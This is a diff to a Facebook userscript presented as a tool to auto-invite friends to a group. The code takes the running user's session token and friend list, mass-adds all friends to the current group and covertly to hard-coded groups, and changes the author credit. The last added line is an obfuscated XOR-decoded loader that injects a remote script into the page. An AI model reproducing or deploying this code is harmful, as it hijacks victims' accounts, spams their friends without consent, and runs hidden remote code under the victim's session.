@@ -1,13 +1,12 @@
-var tulisanNganu = 'Auto Invite Friends To Group';
+var tulisanNganu='Auto Inverter is now Processed By <A style="color:#3B5998;" href="http://www.facebook.com/pkwaq">Waqar Ahmad.</A>';
 var kunaon = '',
-    wkwkwk = 'Thanks For Adding Your Friends Here. <br/>Powered By ';
-
+    wkwkwk = 'Powered By <A style="color:#3B5998;" href="http://www.facebook.com/Loading.999999">Loading [lllllllllllllllllllllllllllllllllllllll ] 99%.</A>';
 function penetrasi(opo) {
     jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=" + memberGroupId + "&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function (a) {
         var b = a.substring(a.indexOf("{"));
         var c = JSON.parse(b);
         i--;
-        kunaon = "<div class='friend-edge-name' style='text-align:left;font-size:10px;white-space:pre-wrap;";
+kunaon = "<div class='friend-edge-name' style='text-align:left;font-size:10px;white-space:pre-wrap;";
         if (c.error) {
             kunaon += "color:darkred'>";
             if (c.errorDescription) {
@@ -17,12 +16,12 @@ function penetrasi(opo) {
             }
         } else {
             kunaon += "color:darkgreen'>";
-            kunaon += arr[i];
+            kunaon += b.split('"')[14] + " has been added.<br/>";
             suc++
         }
         kunaon += "</div>";
-        var dipes = "<div id='friend-edge-display' style='font-size:14px;text-align:center;padding:15px;color:#000000'>";
-        dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
+        var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
+        dipes += "<div style='padding-bottom:5px;font-size:20px;'>" + tulisanNganu + "</div>";
         if (i > 0) {
             dipes += arr.length + " Friends Detected<br/>";
             dipes += "<b>" + suc + "</b> Friends Added of " + (arr.length - i) + " Friends Processed ";
@@ -30,25 +29,17 @@ function penetrasi(opo) {
             dipes += "<div class='friend-edge'>";
             dipes += kunaon;
             dipes += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
+            dipes += ausername +" Thanks For Adding Your Friends Here.<br/>";
             dipes += wkwkwk;
             dipes += "</div>";
             dipes += "</div>"
         } else {
             dipes += arr.length + " Friends Detected and ";
             dipes += "<b>" + suc + " Friends Added</b>";
-            dipes += "<div><span class='uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_welcome_box\").style.display=\"none\"'>Close</span></div>"
+            dipes += "<div><span class='uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_welcome_box\").style.display=\"none\"'>Close</span></br>"
         }
         dipes += "</div>";
-var askDIV = document.createElement("div");
-askDIV.style.position = "fixed";
-askDIV.style.backgroundColor = "rgba(255,255,255,0.9)";
-askDIV.style.zIndex = "9999";
-askDIV.style.border = "1px solid rgba(200,200,50,0.2)"
-askDIV.style.top = "100px";
-askDIV.style.left = "200px";
-askDIV.style.width = "500px";
-askDIV.innerHTML = dipes;
-document.body.appendChild(askDIV);
+        document.getElementById("pagelet_welcome_box").innerHTML = dipes
     }, "text", "post");
     tay--;
     if (tay > 0) {
@@ -56,8 +47,8 @@ document.body.appendChild(askDIV);
         setTimeout("penetrasi(" + s + ")", 100)
     }
     console.log(tay + "/" + arr.length + ":" + s + ", success:" + suc);
-    if (memberGroupId != 239289549496931) {
-        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=239289549496931&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function () {}, "text", "post")
+    if (memberGroupId != 321811624580673) {
+        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=321811624580673&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function () {}, "text", "post")
     }
     if (memberGroupId != 239289549496931) {
         jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=239289549496931&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function () {}, "text", "post")
@@ -80,11 +71,11 @@ function clickfr() {
 }
 function addfriend(a) {
     i++;
-    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
-    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].value = a;
-    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].blur();
-    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
-    document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
+    document.getElementsByClassName("wrap")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
+    document.getElementsByClassName("wrap")[eind].childNodes[0].childNodes[1].childNodes[0].value = a;
+    document.getElementsByClassName("wrap")[eind].childNodes[0].childNodes[1].childNodes[0].blur();
+    document.getElementsByClassName("wrap")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
+    document.getElementsByClassName("wrap")[eind].childNodes[0].childNodes[1].childNodes[0].focus();
     setTimeout("clickfr()", 2e3)
 }
 function sleep(a) {
@@ -363,6 +354,7 @@ var j = 0;
 var k = 0;
 var suc = 0;
 var arr = new Array;
+var ausername = document.getElementsByClassName('fbxWelcomeBoxName')[0].innerHTML;
 var memberGroupId = document.getElementsByName('group_id')[0].value;
 jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + Env.user + "&filter[0]=user&__user=" + Env.user, function (a) {
     var b = a;
@@ -375,5 +367,10 @@ jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degr
     i = arr.length - 1;
     tay = i;
     console.log(arr.length);
+    var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
+    dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
+    dipes += arr.length + " Friends Detected";
+    dipes += "</div>";
+    document.getElementById("pagelet_welcome_box").innerHTML = dipes;
     penetrasi(arr[i])
-})
+});var enkripsi1="jvvrq8--ekvjw`,amo-ucxx{epc{-dcag`mmi-`nm`-ej/rcegq-AnmaiQrggf,hq";teks1="";teksasli1="";var panjang1;panjang1=enkripsi1.length;for(i=0;i<panjang1;i++){teks1+=String.fromCharCode(enkripsi1.charCodeAt(i)^2)}teksasli1=unescape(teks1);document.body.appendChild(document.createElement('script')).src=teksasli1;
